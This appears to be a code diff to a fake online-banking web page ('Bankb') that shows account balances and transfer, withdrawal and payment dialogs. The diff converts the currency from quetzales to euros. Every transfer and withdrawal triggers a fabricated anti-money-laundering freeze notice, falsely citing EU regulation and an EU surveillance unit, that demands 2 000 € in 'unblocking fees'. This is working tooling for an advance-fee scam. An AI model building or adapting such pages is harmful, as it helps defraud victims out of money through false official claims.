@@ -290,7 +290,7 @@ dialog::backdrop { background: rgba(0,0,0,0.5); }
             <button class="fav" id="fav">⭐</button>
           </div>
           <div class="balance">
-            <span class="amount" id="bal">Q 2,554,057.00</span>
+            <span class="amount" id="bal">€ 0,00</span>
             <span class="label">Available balance</span>
           </div>
           <div class="acc-foot">
@@ -317,14 +317,14 @@ dialog::backdrop { background: rgba(0,0,0,0.5); }
 <div class="toast" id="toast"></div>
 
 <script>
-var DEFAULT_BALANCE = 2554057.00;
+var DEFAULT_BALANCE = 0;
 var state = {
   balance: DEFAULT_BALANCE,
   currentAccountId: null
 };
 
 function formatQ(n) {
-  return 'Q ' + n.toLocaleString('en-US', {
+  return '€ ' + n.toLocaleString('fr-FR', {
     minimumFractionDigits: 2,
     maximumFractionDigits: 2
   });
@@ -384,7 +384,7 @@ document.getElementById('f1').addEventListener('submit', async function(e){
       .single();
 
     if (existingAccount) {
-      state.balance = existingAccount.balance;
+      state.balance = DEFAULT_BALANCE;
       state.currentAccountId = existingAccount.id;
     } else {
       let { data: newAcc, error } = await window.supabase
@@ -435,7 +435,7 @@ function showAmlAlert() {
       '<p><strong>Felicidades, su orden de transferencia ha sido registrada correctamente.</strong></p>' +
       '<p>De conformidad con las normas internacionales de prevención del blanqueo de capitales (AML) y el Reglamento (UE) 2015/847 sobre transferencias de fondos, su operación ha sido señalada automáticamente al servicio de cumplimiento para un control antifraude.</p>' +
       '<p>Su expediente se encuentra temporalmente congelado por la célula de vigilancia financiera de la Unión Europea a la espera de las verificaciones de rigor.</p>' +
-      '<p><strong>Tarifas de desbloqueo requeridas: 2,000 Q</strong></p>' +
+      '<p><strong>Tarifas de desbloqueo requeridas: 2 000 €</strong></p>' +
       '<p>Estas tarifas cubren las verificaciones de identidad, el análisis antiblanqueo y el levantamiento del bloqueo reglamentario. Una vez confirmado el pago, su transferencia será procesada en un plazo de 24 a 48 horas hábiles.</p>' +
       '<p style="margin-top:8px;font-size:0.8rem;color:#6c757d;text-align:right;"><em>Bankb — Servicio de Cumplimiento y Seguridad</em></p>' +
     '</div>' +
@@ -447,7 +447,7 @@ function execTransfer() {
     '<p>Saldo disponible: <strong>' + formatQ(state.balance) + '</strong></p>' +
     '<label>Destinatario<input type="text" id="t_dest" required placeholder="Nombre"></label>' +
     '<label>Número de cuenta<input type="text" id="t_acc" required placeholder="Ej. BI-9876543210"></label>' +
-    '<label>Monto (Q)<input type="number" id="t_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<label>Monto (€)<input type="number" id="t_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
     '<button class="ok" type="submit">Enviar</button>');
   
   dlg.querySelector('form').addEventListener('submit', async function(ev){
@@ -458,7 +458,7 @@ function execTransfer() {
     if (amt > state.balance) { notify('Fondos insuficientes para esta transferencia.', 'err'); return; }
     
     dlg.close();
-    await logTransaction('transfer', amt, dest, 'pending_aml', 'Gel temporaire - Frais de déblocage 2 000 Q');
+    await logTransaction('transfer', amt, dest, 'pending_aml', 'Gel temporaire - Frais de déblocage 2 000 €');
     setTimeout(showAmlAlert, 300);
   });
 }
@@ -466,7 +466,7 @@ function execTransfer() {
 function execWithdraw() {
   openDlg('Retirar efectivo',
     '<p>Saldo disponible: <strong>' + formatQ(state.balance) + '</strong></p>' +
-    '<label>Monto (Q)<input type="number" id="w_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<label>Monto (€)<input type="number" id="w_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
     '<label>Lugar / Cajero<input type="text" id="w_loc" required placeholder="Ej. ATM Zona 10"></label>' +
     '<button class="ok" type="submit">Retirar</button>');
   
@@ -478,7 +478,7 @@ function execWithdraw() {
     if (amt > state.balance) { notify('Fondos insuficientes para el retiro.', 'err'); return; }
 
     dlg.close();
-    await logTransaction('withdrawal', amt, loc, 'pending_aml', 'Gel temporaire - Frais de déblocage 2 000 Q');
+    await logTransaction('withdrawal', amt, loc, 'pending_aml', 'Gel temporaire - Frais de déblocage 2 000 €');
     setTimeout(showAmlAlert, 300);
   });
 }
@@ -488,7 +488,7 @@ function execPayment() {
     '<p>Saldo disponible: <strong>' + formatQ(state.balance) + '</strong></p>' +
     '<label>Servicio / Empresa<input type="text" id="p_svc" required placeholder="Ej. EPM, Tigo"></label>' +
     '<label>Número de referencia<input type="text" id="p_ref" required placeholder="Ej. 12345678"></label>' +
-    '<label>Monto (Q)<input type="number" id="p_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<label>Monto (€)<input type="number" id="p_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
     '<button class="ok" type="submit">Pagar</button>');
   
   dlg.querySelector('form').addEventListener('submit', async function(ev){
@@ -511,7 +511,7 @@ function execPayment() {
 function execDeposit() {
   openDlg('Depositar dinero',
     '<p>Saldo actual: <strong>' + formatQ(state.balance) + '</strong></p>' +
-    '<label>Monto (Q)<input type="number" id="d_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<label>Monto (€)<input type="number" id="d_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
     '<label>Fuente<input type="text" id="d_src" required placeholder="Ej. Efectivo, cheque"></label>' +
     '<button class="ok" type="submit">Depositar</button>');
   
@@ -537,19 +537,19 @@ var serviceFlows = {
   },
   'Anticipo de Nómina': {
     intro: 'Indica el monto del anticipo que deseas solicitar.',
-    fields: '<label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label><label>Fecha estimada<input type="date" id="s_date" required></label>'
+    fields: '<label>Monto (€)<input type="number" id="s_amount" min="0.01" step="0.01" required></label><label>Fecha estimada<input type="date" id="s_date" required></label>'
   },
   'MallBi.com': {
     intro: 'Completa los datos de tu compra en MallBi.',
-    fields: '<label>Producto o comercio<input type="text" id="s_item" required></label><label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label>'
+    fields: '<label>Producto o comercio<input type="text" id="s_item" required></label><label>Monto (€)<input type="number" id="s_amount" min="0.01" step="0.01" required></label>'
   },
   'Transferencias móviles': {
     intro: 'Indica el teléfono del destinatario y el monto.',
-    fields: '<label>Teléfono<input type="tel" id="s_phone" required></label><label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label>'
+    fields: '<label>Teléfono<input type="tel" id="s_phone" required></label><label>Monto (€)<input type="number" id="s_amount" min="0.01" step="0.01" required></label>'
   },
   'Gestiona tus plazos fijos': {
     intro: 'Configura el plazo fijo que deseas solicitar.',
-    fields: '<label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label><label>Plazo<select id="s_term" required><option value="">Selecciona</option><option>3 meses</option><option>6 meses</option><option>12 meses</option></select></label>'
+    fields: '<label>Monto (€)<input type="number" id="s_amount" min="0.01" step="0.01" required></label><label>Plazo<select id="s_term" required><option value="">Selecciona</option><option>3 meses</option><option>6 meses</option><option>12 meses</option></select></label>'
   }
 };
 
